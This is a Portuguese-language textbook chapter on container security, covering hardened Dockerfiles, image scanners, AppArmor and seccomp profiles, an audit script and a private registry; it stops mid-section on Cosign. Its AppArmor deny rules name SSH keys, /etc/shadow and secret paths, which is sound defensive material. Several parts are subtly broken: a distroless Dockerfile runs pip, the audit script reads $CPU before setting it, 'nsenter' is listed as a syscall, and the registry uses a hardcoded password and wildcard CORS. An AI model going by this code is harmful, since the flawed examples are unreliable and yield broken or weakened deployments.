---
layout: default
title: "07-seguranca-de-containers"
---

# Capítulo 7 — Segurança de Containers

Containers revolucionaram a forma como desenvolvemos, distribuímos e executamos
aplicações. Contudo, a agilidade que trouxeram também ampliou o superfície de
ataque. Este capítulo apresenta as práticas essenciais para proteger containers
ao longo de todo o ciclo de vida — da criação da imagem à execução em
produção.

---

## 1. Fundamentos de Segurança em Containers

### 1.1 Containers vs VMs — Modelo de Segurança

Containers e máquinas virtuais adotam modelos de isolamento fundamentalmente
diferentes:

| Aspecto             | Container                          | VM                              |
|----------------------|------------------------------------|---------------------------------|
| Isolamento           | Processos compartilham kernel      | Kernel dedicado por VM          |
| Superfície de ataque | Kernel + runtime + configuração    | Hipervisor + kernel isolado     |
| Tamanho              | Megabytes                          | Gigabytes                       |
| Velocidade de arranque | Segundos                        | Minutos                         |
| Recursos             | Compartilhados                     | Deduplicados                    |

Um container não fornece a mesma barreira de segurança que uma VM. O kernel do
sistema operacional é compartilhado entre o host e todos os containers. Isso
significa que uma vulnerabilidade no kernel pode comprometer todos os containers
simultaneamente.

### 1.2 Superfície de Ataque de Containers

A superfície de ataque inclui:

- **Runtime**: processos dentro do container, syscalls expostas ao kernel
- **Imagem**: dependências vulneráveis, código malicioso embutido
- **Rede**: portas expostas, comunicação entre containers
- **Orquestração**: configurações do Docker daemon, API socket
- **Storage**: volumes montados, dados persistentes
- **Host**: kernel compartilhado, dispositivos expostos

### 1.3 OCI Runtime Security

O padrão OCI (Open Container Initiative) define especificações para imagens,
containers e runtimes. A especificação de runtime controla como o container
executa no sistema operacional:

```
┌─────────────────────────────────┐
│         Aplicação               │
├─────────────────────────────────┤
│    OCI Runtime Spec             │
│  (config.json, bundle)         │
├─────────────────────────────────┤
│    Container Runtime            │
│  (runc, crun, Kata Containers) │
├─────────────────────────────────┤
│    Linux Kernel                 │
│  (namespaces, cgroups, seccomp) │
└─────────────────────────────────┘
```

### 1.4 Namespaces e Cgroups

**Namespaces** proporcionam isolamento de recursos:

- **PID**: cada container vê apenas seus próprios processos
- **NET**: stack de rede isolada, interfaces virtuais
- **MNT**: sistemas de arquivo isolados
- **UTS**: nome de hostname isolado
- **IPC**: comunicação entre processos isolada
- **USER**: mapeamento de UID/GID entre host e container

**Cgroups** controlam o consumo de recursos:

- Limitação de CPU e memória
- I/O de disco e rede
- Priorização de processos

```bash
# Verificar namespaces de um container
ls -la /proc/$$/ns/

# Verificar cgroups atribuídos
cat /proc/$$/cgroup
```

---

## 2. Dockerfile Seguro

### 2.1 Multi-stage Builds

Multi-stage builds reduzem o tamanho da imagem e eliminam ferramentas de
compilação que não são necessárias em produção:

```dockerfile
# Fase 1: compilação
FROM python:3.12-slim AS builder

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Fase 2: imagem final
FROM python:3.12-slim

RUN groupadd -r appuser && useradd -r -g appuser appuser

WORKDIR /app
COPY --from=builder /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages
COPY --chown=appuser:appuser . .

USER appuser
EXPOSE 5000

CMD ["python", "app.py"]
```

### 2.2 Distroless Base Images

Imagens distroless contêm apenas a aplicação e suas dependências runtime. Não
incluem shell, gerenciador de pacotes ou outras ferramentas:

```dockerfile
FROM gcr.io/distroless/python3-debian12

COPY --chown=nonroot:nonroot app.py /app/
COPY --chown=nonroot:nonroot requirements.txt /app/

WORKDIR /app
RUN pip install --no-cache-dir -r requirements.txt

USER nonroot
ENTRYPOINT ["python", "app.py"]
```

Vantagens:
- Imagem extremamente pequena
- Sem shell para explorar em caso de comprometimento
- Menos dependências vulneráveis

### 2.3 Non-root User

Nunca execute containers como root em produção:

```dockerfile
# Criar usuário dedicado
RUN groupadd -r appgroup && useradd -r -g appgroup -d /app -s /sbin/nologin appuser

# Garantir permissões corretas
COPY --chown=appuser:appgroup . /app/

# Alternar para o usuário não-root
USER appuser
```

```bash
# Verificar se o container roda como root
docker inspect --format='{{.Config.User}}' myapp:latest

# Listar processos e verificar UID
docker exec myapp ps aux
```

### 2.4 Read-Only Filesystem

Tornar o filesystem do container somente leitura previne modificações
maliciosas:

```dockerfile
# Criar diretório para dados temporários
RUN mkdir -p /tmp/app && chown appuser:appgroup /tmp/app

VOLUME ["/tmp/app"]
```

```bash
# Executar com filesystem somente leitura
docker run --read-only --tmpfs /tmp:rw,noexec,nosuid myapp:latest

# Montar apenas diretórios necessários como escrita
docker run \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  --tmpfs /var/run:rw,noexec,nosuid,size=10m \
  myapp:latest
```

### 2.5 No New Privileges

Impedir que processos dentro do container adiquiram privilégios adicionais:

```bash
# Executar com --security-opt=no-new-privileges
docker run --security-opt=no-new-privileges myapp:latest
```

```dockerfile
# No Dockerfile, usar LABEL para documentar a intenção
LABEL security.no-new-privileges="true"
```

### 2.6 Dockerfile Hardened — Python Flask

```dockerfile
FROM python:3.12-slim AS builder

RUN apt-get update && \
    apt-get install -y --no-install-recommends gcc libpq-dev && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /build
COPY requirements.txt .
RUN pip install --no-cache-dir --prefix=/install -r requirements.txt

# --- Imagem final ---
FROM python:3.12-slim

RUN apt-get update && \
    apt-get install -y --no-install-recommends libpq5 curl && \
    rm -rf /var/lib/apt/lists/* && \
    groupadd -r flask && useradd -r -g flask -d /app -s /sbin/nologin flask && \
    mkdir -p /app /var/log/app && \
    chown -R flask:flask /app /var/log/app

COPY --from=builder /install /usr/local
COPY --chown=flask:flask . /app/

WORKDIR /app

USER flask

HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
    CMD curl -f http://localhost:5000/health || exit 1

EXPOSE 5000

CMD ["gunicorn", "--bind", "0.0.0.0:5000", "--workers", "4", "app:app"]
```

### 2.7 Dockerfile Hardened — Node.js

```dockerfile
FROM node:20-alpine AS builder

WORKDIR /build
COPY package*.json ./
RUN npm ci --only=production && \
    npm cache clean --force

# --- Imagem final ---
FROM node:20-alpine

RUN addgroup -g 1001 -S appgroup && \
    adduser -S appuser -u 1001 -G appgroup

WORKDIR /app

COPY --from=builder --chown=appuser:appgroup /build/node_modules ./node_modules
COPY --chown=appuser:appgroup . .

USER appuser

EXPOSE 3000

CMD ["node", "server.js"]
```

### 2.8 Dockerfile Hardened — Go Static Binary

```dockerfile
FROM golang:1.22-alpine AS builder

RUN apk add --no-cache git ca-certificates

WORKDIR /build
COPY go.mod go.sum ./
RUN go mod download

COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /app/server .

# --- Imagem final ---
FROM scratch

COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
COPY --from=builder /app/server /server

USER 65534:65534

ENTRYPOINT ["/server"]
```

### 2.9 Dockerfile Hardened — Java Spring Boot

```dockerfile
FROM eclipse-temurin:21-jdk-alpine AS builder

WORKDIR /build
COPY gradle/ gradle/
COPY gradlew build.gradle settings.gradle ./
RUN ./gradlew dependencies --no-daemon

COPY src/ src/
RUN ./gradlew bootJar --no-daemon -x test

# --- Imagem final ---
FROM eclipse-temurin:21-jre-alpine

RUN addgroup -g 1001 -S spring && \
    adduser -S spring -u 1001 -G spring

WORKDIR /app

COPY --from=builder --chown=spring:spring /build/build/libs/*.jar app.jar

USER spring

EXPOSE 8080

ENTRYPOINT ["java", \
    "-XX:+UseContainerSupport", \
    "-XX:MaxRAMPercentage=75.0", \
    "-Djava.security.egd=file:/dev/./urandom", \
    "-jar", "app.jar"]
```

### 2.10 Regras do Dockerfile Seguro

```dockerfile
# 1. Usar imagem base específica com hash
FROM python:3.12.3-slim@sha256:abc123...

# 2. Instalar apenas o necessário
RUN apt-get update && \
    apt-get install -y --no-install-recommends curl && \
    rm -rf /var/lib/apt/lists/*

# 3. Copiar e instalar dependências antes do código
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# 4. Criar usuário e definir permissões
RUN groupadd -r app && useradd -r -g app -s /sbin/nologin app
COPY --chown=app:app . /app

# 5. Usar HEALTHCHECK
HEALTHCHECK --interval=30s --timeout=3s \
    CMD curl -f http://localhost:8080/health || exit 1

# 6. Não expor variáveis sensíveis
# Usar secrets do orchestrator em vez de ENV para credenciais

# 7. Adicionar LABELs de segurança
LABEL security.scan.enabled="true"
LABEL maintainer="security@empresa.com"
```

---

## 3. Scanning de Imagens

### 3.1 Trivy

Trivy é um scanner de vulnerabilidades open-source que suporta imagens Docker,
sistemas de arquivos e repositórios Git:

```bash
# Instalar Trivy
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin

# Scan básico de imagem
trivy image python:3.12-slim

# Scan com severidade mínima
trivy image --severity HIGH,CRITICAL myapp:latest

# Scan com output em formato JSON
trivy image -f json -o results.json myapp:latest

# Scan com ignore de CVEs específicos
trivy image --ignorefile .trivyignore myapp:latest

# Formato de arquivo .trivyignore
# CVE-2023-12345
# CVE-2023-67890

# Scan com política de saída
trivy image --exit-code 1 --severity CRITICAL myapp:latest

# Scan de Dockerfile (misconfigurations)
trivy config Dockerfile

# Scan de projeto (dependências)
trivy fs --scanners vuln,secret,misconfig .
```

### 3.2 Grype

Grype é o scanner da Anchore focado em vulnerabilidades de imagens:

```bash
# Instalar Grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Scan básico
grype myapp:latest

# Scan com severidade mínima
grype --fail-on high myapp:latest

# Output em formato JSON
grype myapp:latest -o json > grype-results.json

# Comparar duas imagens para novas vulnerabilidades
grype myapp:v1 --add-cpes-if-none -o json > v1.json
grype myapp:v2 --add-cpes-if-none -o json > v2.json

# Scan com database atualizada
grype db update
grype myapp:latest
```

### 3.3 Docker Scout

Docker Scout é integrado ao ecossistema Docker:

```bash
# Ativar Docker Scout
docker scout quickview myapp:latest

# Comparar com versão anterior
docker scout compare myapp:latest --to myapp:previous

# Recomendações de correção
docker scout recommendations myapp:latest

# Scan com formato JSON
docker scout cves myapp:latest --format json
```

### 3.4 Snyk Container

```bash
# Instalar Snyk
npm install -g snyk

# Autenticar
snyk auth

# Scan de imagem
snyk container test myapp:latest

# Monitor de imagem (contínuo)
snyk container monitor myapp:latest

# Scan com política personalizada
snyk container test myapp:latest --file=Dockerfile
```

### 3.5 Pipeline Completa de Scanning

```yaml
# .github/workflows/image-scan.yml
name: Image Security Scan

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

env:
  IMAGE_NAME: myapp
  REGISTRY: ghcr.io

jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build image
        run: docker build -t ${{ env.IMAGE_NAME }}:${{ github.sha }} .

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.IMAGE_NAME }}:${{ github.sha }}
          format: sarif
          output: trivy-results.sarif
          severity: CRITICAL,HIGH
          exit-code: 1

      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy-results.sarif

      - name: Run Grype scanner
        uses: anchore/scan-action@v4
        with:
          image: ${{ env.IMAGE_NAME }}:${{ github.sha }}
          fail-build: true
          severity-cutoff: high

      - name: Run Docker Scout
        uses: docker/scout-action@v1
        with:
          command: cves
          image: ${{ env.IMAGE_NAME }}:${{ github.sha }}
          only-severities: critical,high
          exit-code: true
```

### 3.6 Políticas de Severidade de CVE

```yaml
# security-policies/container-scan-policy.yml
apiVersion: v1
kind: SecurityPolicy
metadata:
  name: container-vulnerability-policy
spec:
  rules:
    - name: block-critical
      severity: CRITICAL
      action: BLOCK
      description: "CVEs criticos bloqueiam o pipeline"

    - name: block-high
      severity: HIGH
      action: BLOCK
      description: "CVEs altos bloqueiam o pipeline"

    - name: warn-medium
      severity: MEDIUM
      action: WARN
      description: "CVEs medios geram alerta"

    - name: ignore-low
      severity: LOW
      action: IGNORE
      description: "CVEs baixos sao ignorados"

  exceptions:
    - cve: "CVE-2023-12345"
      reason: "Vendor advisory: fixed in next release"
      expires: "2024-06-01"

    - package: "libssl1.1"
      reason: "Deprecated, migration planned"
      expires: "2024-03-01"
```

```bash
# Script de verificacao de politicas
#!/bin/bash
set -euo pipefail

IMAGE="$1"
CRITICAL_THRESHOLD=0
HIGH_THRESHOLD=5

# Executar Trivy e extrair contagem por severidade
RESULTS=$(trivy image --format json "$IMAGE")

CRITICAL_COUNT=$(echo "$RESULTS" | jq '[.Results[].Vulnerabilities[]? | select(.Severity == "CRITICAL")] | length')
HIGH_COUNT=$(echo "$RESULTS" | jq '[.Results[].Vulnerabilities[]? | select(.Severity == "HIGH")] | length')
MEDIUM_COUNT=$(echo "$RESULTS" | jq '[.Results[].Vulnerabilities[]? | select(.Severity == "MEDIUM")] | length')

echo "=== Relatorio de Vulnerabilidades ==="
echo "Imagem: $IMAGE"
echo "Criticas: $CRITICAL_COUNT"
echo "Altas: $HIGH_COUNT"
echo "Medias: $MEDIUM_COUNT"
echo ""

if [ "$CRITICAL_COUNT" -gt "$CRITICAL_THRESHOLD" ]; then
    echo "FALHA: $CRITICAL_COUNT CVEs criticas encontradas (limite: $CRITICAL_THRESHOLD)"
    exit 1
fi

if [ "$HIGH_COUNT" -gt "$HIGH_THRESHOLD" ]; then
    echo "FALHA: $HIGH_COUNT CVEs altas encontradas (limite: $HIGH_THRESHOLD)"
    exit 1
fi

echo "APROVADA: Imagem dentro dos limites de politica"
```

---

## 4. Runtime Security

### 4.1 AppArmor Profiles

AppArmor restringe as capacidades de um container no nível do sistema operacional:

```
# /etc/apparmor.d/docker-custom
#include <tunables/global>

profile docker-custom flags=(attach_disconnected) {
  #include <abstractions/base>

  # Negar acesso a todos os arquivos sensíveis
  deny /proc/*/mounts r,
  deny /proc/*/status w,
  deny /sys/firmware/** rwklx,

  # Negar acesso a dispositivos
  deny /dev/mem rw,
  deny /dev/kmem rw,
  deny /dev/sda* rw,

  # Permitir apenas leitura do filesystem necessario
  /app/** r,
  /app/logs/ w,
  /tmp/** rw,

  # Negar criacao de sockets
  deny network raw,

  # Negar acesso a chaves SSH
  deny /root/.ssh/** rwklx,
  deny /home/*/.ssh/** rwklx,
}
```

```bash
# Executar container com perfil AppArmor
docker run --security-opt apparmor=docker-custom myapp:latest

# Verificar perfil ativo
docker inspect --format='{{.AppArmorProfile}}' myapp:latest

# Carregar perfil manualmente
sudo apparmor_parser -r /etc/apparmor.d/docker-custom
```

### 4.2 Seccomp Profiles

Seccomp (Secure Computing Mode) filtra syscalls que o container pode invocar:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_AARCH64"
  ],
  "syscalls": [
    {
      "names": [
        "accept", "access", "arch_prctl", "bind", "brk",
        "clone", "close", "connect", "dup", "dup2",
        "epoll_create", "epoll_ctl", "epoll_wait",
        "execve", "exit", "exit_group",
        "fcntl", "fstat", "futex",
        "getdents64", "getpid", "getsockname", "gettid",
        "ioctl", "listen", "lseek",
        "mmap", "mprotect", "munmap",
        "nanosleep", "newfstatat",
        "openat", "pipe", "poll",
        "read", "recvfrom", "rt_sigaction", "rt_sigprocmask",
        "sendto", "set_robust_list", "set_tid_address",
        "socket", "stat", "statfs",
        "write", "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["mount", "umount2", "ptrace", "kexec_load",
                "reboot", "init_module", "delete_module",
                "keyctl", "add_key", "request_key",
                "unshare", "setns"],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 1
    }
  ]
}
```

```bash
# Salvar como seccomp-profile.json e usar:
docker run --security-opt seccomp=seccomp-profile.json myapp:latest

# Usar perfil default do Docker
docker run --security-opt seccomp=default myapp:latest

# Desabilitar seccomp (NAO recomendado)
docker run --security-opt seccomp=unconfined myapp:latest
```

### 4.3 Linux Capabilities

Linux capabilities dividem o poder de root em permissões granulares:

```bash
# Container default tem muitas capabilities — restringir
docker run \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  --cap-add CHOWN \
  --cap-add SETGID \
  --cap-add SETUID \
  myapp:latest
```

Capabilities perigosas que NUNCA devem ser adicionadas:

| Capability        | Risco                                                  |
|-------------------|--------------------------------------------------------|
| SYS_ADMIN         | Equivalente a root total — montar filesystems, etc.    |
| NET_ADMIN         | Configuracao de rede, sniffing de trafego              |
| SYS_PTRACE        | Acesso a processos de outros containers                |
| SYS_MODULE        | Carregar modulos do kernel                             |
| SYS_RAWIO         | Acesso direto a dispositivos                           |
| SYS_BOOT          | Reiniciar o sistema                                    |
| AUDIT_WRITE       | Escrever no log de auditoria                           |
| NET_RAW           | Enviar pacotes arbitrarios (ping spoof)                |

```bash
# Verificar capabilities de um container
docker exec myapp cat /proc/1/status | grep Cap

# Decodificar capabilities
capsh --decode=00000000a80425fb
```

### 4.4 AppArmor Profile Completo para Produção

```
# /etc/apparmor.d/docker-production
#include <tunables/global>

profile docker-production flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Negar acesso a todos os arquivos do host
  deny / r,
  deny /boot/** rwklx,
  deny /dev/** rwklx,
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /proc/*/ns/** rwklx,
  deny /sys/** wklx,

  # Permitir leitura de /proc necessaria
  /proc/self/** r,
  /proc/sys/kernel/random/uuid r,

  # Negar criacao de symlinks (previne path traversal)
  deny /** l,

  # Negar montagem de filesystems
  deny mount,

  # Negar acesso a ptrace
  deny ptrace,

  # Negar acesso a chaves e secrets
  deny /run/secrets/** rwklx,
  deny /root/** rwklx,
  deny /home/**/.ssh/** rwklx,

  # Permissao para a aplicacao
  /app/** r,
  /app/logs/ rw,
  /app/logs/** rw,
  /tmp/ rw,
  /tmp/** rw,

  # Rede
  network inet stream,
  network inet dgram,
  network inet6 stream,
  network inet6 dgram,

  # Sinais
  signal (send) peer=unconfined,
  signal (receive) peer=unconfined,

  # Executavel
  /app/bin/server mr,
}
```

### 4.5 Seccomp Profile Completo para Producao

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": [
    "SCMP_ARCH_X86_64",
    "SCMP_ARCH_X86",
    "SCMP_ARCH_AARCH64"
  ],
  "syscalls": [
    {
      "comment": "Chamadas de sistema essenciais",
      "names": [
        "access", "arch_prctl", "brk",
        "close", "dup", "dup2", "dup3",
        "epoll_create1", "epoll_ctl", "epoll_pwait",
        "execve", "exit", "exit_group",
        "fcntl", "fstat", "futex",
        "getcwd", "getdents64", "getegid", "geteuid",
        "getgid", "getpid", "getppid", "getsockname",
        "gettid", "getuid",
        "ioctl", "lseek",
        "mmap", "mprotect", "munmap",
        "nanosleep", "newfstatat",
        "openat", "pipe", "pipe2", "poll",
        "prlimit64",
        "read", "readlink", "recvfrom", "recvmsg",
        "rename", "rt_sigaction", "rt_sigprocmask",
        "rt_sigreturn",
        "sendmsg", "sendto", "set_robust_list",
        "set_tid_address", "setitimer",
        "socket", "stat", "statfs", "statx",
        "tgkill", "time", "clock_gettime",
        "write", "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "Chamadas bloqueadas explicitamente",
      "names": [
        "bpf", "clone3", "execveat",
        "init_module", "finit_module", "delete_module",
        "kcmp", "kexec_file_load", "kexec_load",
        "keyctl", "add_key", "request_key",
        "mount", "umount", "umount2", "pivot_root",
        "ptrace", "process_vm_readv", "process_vm_writev",
        "reboot", "sethostname", "setdomainname",
        "swapon", "swapoff",
        "syslog", "sysinfo",
        "unshare", "setns", "nsenter",
        "userfaultfd",
        "vhangup", "vmsplice"
      ],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 1
    }
  ]
}
```

---

## 5. Docker Bench Security

### 5.1 CIS Docker Benchmark

O Center for Internet Security (CIS) publica benchmark de seguranca para Docker.
As principais categorias sao:

1. **Host Configuration** — configuracao do sistema operacional host
2. **Docker daemon configuration** — configuracao do daemon Docker
3. **Docker daemon configuration files** — arquivos de configuracao
4. **Container Images and Build Files** — seguranca de imagens
5. **Container Runtime** — configuracao de execucao
6. **Docker Security Operations** — operacoes de seguranca

### 5.2 Docker Bench Automation

```bash
# Executar Docker Bench Security
docker run --rm --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  -v /etc:/etc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  docker/docker-bench-security
```

### 5.3 Script Completo de Auditoria de Seguranca

```bash
#!/bin/bash
# docker-security-audit.sh — Auditoria de seguranca de containers

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASS=0
WARN=0
FAIL=0
INFO=0

log_pass() { echo -e "${GREEN}[PASS]${NC} $1"; ((PASS++)); }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; ((WARN++)); }
log_fail() { echo -e "${RED}[FAIL]${NC} $1"; ((FAIL++)); }
log_info() { echo -e "[INFO] $1"; ((INFO++)); }

echo "============================================="
echo "  Auditoria de Seguranca de Containers"
echo "  Data: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "============================================="
echo ""

# --- 1. Verificar se o Docker daemon esta configurado de forma segura ---
echo "=== Docker Daemon Configuration ==="

# 1.1 Verificar se nao roda como root
DOCKER_USER=$(ps -eo user,comm | grep dockerd | awk '{print $1}' | head -1)
if [ "$DOCKER_USER" != "root" ]; then
    log_pass "Docker daemon nao roda como root"
else
    log_warn "Docker daemon roda como root — considere usar rootless"
fi

# 1.2 Verificar seContentSizeLimit esta habilitado
if docker info 2>/dev/null | grep -q "Experimental.*true"; then
    log_info "Docker experimental mode esta habilitado"
fi

# 1.3 Verificar versao do Docker
DOCKER_VERSION=$(docker version --format '{{.Server.Version}}')
log_info "Docker daemon versao: $DOCKER_VERSION"

# 1.4 Verificar logging driver
LOG_DRIVER=$(docker info --format '{{.LoggingDriver}}')
if [ "$LOG_DRIVER" = "json-file" ]; then
    LOG_MAX=$(docker info --format '{{.LoggingDriver}}' 2>/dev/null)
    log_pass "Logging driver: $LOG_DRIVER"
else
    log_warn "Logging driver: $LOG_DRIVER — considere json-file ou syslog"
fi

# --- 2. Verificar containers em execucao ---
echo ""
echo "=== Container Runtime Checks ==="

CONTAINERS=$(docker ps -q)
if [ -z "$CONTAINERS" ]; then
    log_info "Nenhum container em execucao"
else
    for CID in $CONTAINERS; do
        CNAME=$(docker inspect --format '{{.Name}}' "$CID" | sed 's/^\///')
        echo ""
        log_info "Container: $CNAME ($CID)"

        # 2.1 Verificar se roda como root
        CUSER=$(docker inspect --format '{{.Config.User}}' "$CID")
        if [ -z "$CUSER" ] || [ "$CUSER" = "root" ] || [ "$CUSER" = "0" ]; then
            log_fail "  Roda como root"
        else
            log_pass "  Roda como usuario: $CUSER"
        fi

        # 2.2 Verificar se tem privilegios
        PRIV=$(docker inspect --format '{{.HostConfig.Privileged}}' "$CID")
        if [ "$PRIV" = "true" ]; then
            log_fail "  Container privilegiado"
        else
            log_pass "  Nao e privilegiado"
        fi

        # 2.3 Verificar novos privilegios
        NPL=$(docker inspect --format '{{.HostConfig.SecurityOpt}}' "$CID")
        if echo "$NPL" | grep -q "no-new-privileges"; then
            log_pass "  no-new-privileges habilitado"
        else
            log_warn "  no-new-privileges NAO habilitado"
        fi

        # 2.4 Verificar AppArmor
        APPARMOR=$(docker inspect --format '{{.AppArmorProfile}}' "$CID")
        if [ -n "$APPARMOR" ] && [ "$APPARMOR" != "<no value>" ]; then
            log_pass "  AppArmor profile: $APPARMOR"
        else
            log_warn "  Nenhum perfil AppArmor configurado"
        fi

        # 2.5 Verificar seccomp
        SECCOMP=$(docker inspect --format '{{.HostConfig.SecurityOpt}}' "$CID")
        if echo "$SECCOMP" | grep -q "seccomp"; then
            log_pass "  Seccomp habilitado"
        else
            log_warn "  Seccomp usando perfil default"
        fi

        # 2.6 Verificar filesystem somente leitura
        RO=$(docker inspect --format '{{.HostConfig.ReadonlyRootfs}}' "$CID")
        if [ "$RO" = "true" ]; then
            log_pass "  Filesystem root somente leitura"
        else
            log_warn "  Filesystem root NAO e somente leitura"
        fi

        # 2.7 Verificar limites de recursos
        MEM=$(docker inspect --format '{{.HostConfig.Memory}}' "$CPU")
        if [ "$MEM" = "0" ]; then
            log_warn "  Sem limite de memoria"
        else
            log_pass "  Limite de memoria: $((MEM / 1024 / 1024))MB"
        fi

        CPU=$(docker inspect --format '{{.HostConfig.NanoCpus}}' "$CID")
        if [ "$CPU" = "0" ]; then
            log_warn "  Sem limite de CPU"
        else
            log_pass "  Limite de CPU configurado"
        fi

        # 2.8 Verificar capabilities
        CAPS=$(docker inspect --format '{{.HostConfig.CapAdd}}' "$CID")
        if [ "$CAPS" = "[]" ] || [ -z "$CAPS" ]; then
            log_pass "  Nenhuma capability adicional"
        else
            log_warn "  Capabilities adicionais: $CAPS"
        fi

        # 2.9 Verificar portas expostas
        PORTS=$(docker inspect --format '{{.NetworkSettings.Ports}}' "$CID")
        if echo "$PORTS" | grep -q "0.0.0.0"; then
            log_warn "  Portas expostas em todas as interfaces"
        else
            log_pass "  Portas nao expostas em 0.0.0.0"
        fi

        # 2.10 Verificar healthcheck
        HC=$(docker inspect --format '{{.Config.Healthcheck}}' "$CID")
        if [ "$HC" = "<nil>" ] || [ -z "$HC" ]; then
            log_warn "  Sem healthcheck configurado"
        else
            log_pass "  Healthcheck configurado"
        fi
    done
fi

# --- 3. Verificar imagens ---
echo ""
echo "=== Image Security Checks ==="

IMAGES=$(docker images --format '{{.Repository}}:{{.Tag}}' | grep -v '<none>')
for IMG in $IMAGES; do
    echo ""
    log_info "Imagem: $IMG"

    # 3.1 Verificar se usa tag latest
    if echo "$IMG" | grep -q ":latest"; then
        log_warn "  Usa tag :latest — use tags especificas"
    fi

    # 3.2 Verificar tamanho da imagem
    SIZE=$(docker inspect --format '{{.Size}}' "$IMG" 2>/dev/null || echo "0")
    SIZE_MB=$((SIZE / 1024 / 1024))
    if [ "$SIZE_MB" -gt 500 ]; then
        log_warn "  Imagem grande: ${SIZE_MB}MB"
    else
        log_pass "  Tamanho razoavel: ${SIZE_MB}MB"
    fi
done

# --- 4. Verificar redes ---
echo ""
echo "=== Network Security Checks ==="

NETWORKS=$(docker network ls --format '{{.Name}}' | grep -v bridge | grep -v host | grep -v none)
for NET in $NETWORKS; do
    log_info "Rede: $NET"
    # Verificar se nao e bridge default
    if [ "$NET" = "bridge" ]; then
        log_warn "  Rede bridge default em uso"
    fi
done

# --- 5. Verificar Docker socket ---
echo ""
echo "=== Docker Socket Checks ==="

SOCKETS=$(docker ps -q --filter "volume=/var/run/docker.sock")
if [ -n "$SOCKETS" ]; then
    log_fail "Container com acesso ao Docker socket!"
    for SID in $SOCKETS; do
        SNAME=$(docker inspect --format '{{.Name}}' "$SID" | sed 's/^\///')
        log_fail "  Container: $SNAME"
    done
else
    log_pass "Nenhum container com acesso ao Docker socket"
fi

# --- Resumo ---
echo ""
echo "============================================="
echo "  RESUMO DA AUDITORIA"
echo "============================================="
echo -e "  ${GREEN}PASS: $PASS${NC}"
echo -e "  ${YELLOW}WARN: $WARN${NC}"
echo -e "  ${RED}FAIL: $FAIL${NC}"
echo "  INFO: $INFO"
echo ""

if [ "$FAIL" -gt 0 ]; then
    echo -e "${RED}RESULTADO: ATENCAO NECESSARIA — $FAIL finding(s) criticos${NC}"
    exit 1
elif [ "$WARN" -gt 0 ]; then
    echo -e "${YELLOW}RESULTADO: REVISAO RECOMENDADA — $WARN warning(s)${NC}"
    exit 0
else
    echo -e "${GREEN}RESULTADO: APROVADO — nenhum problema encontrado${NC}"
    exit 0
fi
```

---

## 6. Registry Security

### 6.1 Registro Privado com TLS

```bash
# Criar registro privado com autenticacao
mkdir -p /etc/docker/registry

# Gerar certificados TLS
openssl req -newkey rsa:4096 -nodes -sha256 \
  -keyout registry.key -x509 -days 365 \
  -out registry.crt -subj "/CN=registry.example.com"

# Configurar autenticacao basica
mkdir -p auth
docker run --entrypoint htpasswd httpd:2 -Bbn admin senha123 > auth/htpasswd
```

```yaml
# registry-config.yml
version: 0.1
log:
  level: info
  fields:
    service: registry
storage:
  filesystem:
    rootdirectory: /var/lib/registry
  delete:
    enabled: true
  cache:
    blobdescriptor: inmemory
http:
  addr: 0.0.0.0:5000
  headers:
    X-Content-Type-Options: [nosniff]
    Access-Control-Allow-Origin: ['*']
    Access-Control-Allow-Methods: ['HEAD', 'GET', 'OPTIONS', 'DELETE']
  tls:
    certificate: /certs/registry.crt
    key: /certs/registry.key
auth:
  htpasswd:
    realm: Registry Realm
    path: /auth/htpasswd
```

```yaml
# docker-compose.yml para registro privado
version: "3.8"

services:
  registry:
    image: registry:2
    container_name: private-registry
    restart: always
    ports:
      - "127.0.0.1:5000:5000"
    environment:
      REGISTRY_STORAGE_DELETE_ENABLED: "true"
    volumes:
      - registry-data:/var/lib/registry
      - ./registry-config.yml:/etc/docker/registry/config.yml:ro
      - ./auth:/auth:ro
      - ./certs:/certs:ro
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp
    healthcheck:
      test: ["CMD", "wget", "--spider", "-q", "http://localhost:5000/v2/"]
      interval: 30s
      timeout: 5s
      retries: 3

volumes:
  registry-data:
```

### 6.2 Image Signing com Cosign

```bash
# Instalar Cosign
go install github.com/sigstore/cosign/v2/cmd/cosign@latest

# Gerar chave de assinatura
cosign generate-key-pair

# Assinar imagem
